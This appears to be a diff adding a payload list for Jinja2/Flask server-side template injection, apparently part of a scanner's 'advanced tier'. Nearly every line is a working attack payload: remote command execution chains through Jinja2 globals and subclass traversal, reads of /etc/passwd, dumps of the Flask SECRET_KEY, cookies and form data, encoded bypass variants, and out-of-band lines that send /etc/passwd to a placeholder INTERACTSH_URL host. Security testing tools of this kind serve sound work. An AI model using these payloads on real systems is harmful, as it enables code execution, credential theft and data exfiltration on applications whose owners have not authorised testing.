@@ -1,0 +1,51 @@
+# Jinja2/Flask SSTI — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+# ── Advanced — RCE chains ──────────────────────────────────────────────────
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{get_flashed_messages.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+# ── Advanced — subclass traversal ─────────────────────────────────────────
+{{''.__class__.__base__.__subclasses__()}}
+{{().__class__.__bases__[0].__subclasses__()}}
+{{range.__class__.__mro__[-1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+# ── Advanced — self reference ──────────────────────────────────────────────
+{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
+# ── Advanced — filter chain ────────────────────────────────────────────────
+{{'id'|popen|string}}
+# ── Advanced — loop-based bypass ──────────────────────────────────────────
+{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
+# ── Advanced — arithmetic / canary probes ──────────────────────────────────
+{{7*'7'}}
+{{7|int}}
+{{[].__class__.__mro__}}
+# ── Advanced — template logic ──────────────────────────────────────────────
+{% set x %}{{7*7}}{% endset %}{{x}}
+{%- if 1==1 -%}SSTI_CONFIRMED{%- endif -%}
+# ── Advanced — namespace ───────────────────────────────────────────────────
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{request.__class__._load_form_data.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+# ── URL-encoded Jinja2 ─────────────────────────────────────────────────────
+%7b%7b7*7%7d%7d
+%7b%7b''.__class__.__mro__[1].__subclasses__()%7d%7d
+%257b%257b7*7%257d%257d
+{{7*7}}
+&#123;&#123;7*7&#125;&#125;
+# ── Additional Jinja2 RCE ──────────────────────────────────────────────────
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+{{().__class__.__bases__[0].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
+{{config.items()}}
+{{config['SECRET_KEY']}}
+{{request.environ['SERVER_SOFTWARE']}}
+{{request.cookies}}
+{{request.args}}
+{{request.form}}
+# ── OOB via Jinja2 ─────────────────────────────────────────────────────────
+{{config.__class__.__init__.__globals__['os'].popen('curl http://INTERACTSH_URL/?c='+open('/etc/passwd').read()).read()}}
+{{''.__class__.__mro__[1].__subclasses__()[378].__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://INTERACTSH_URL/').read()}}
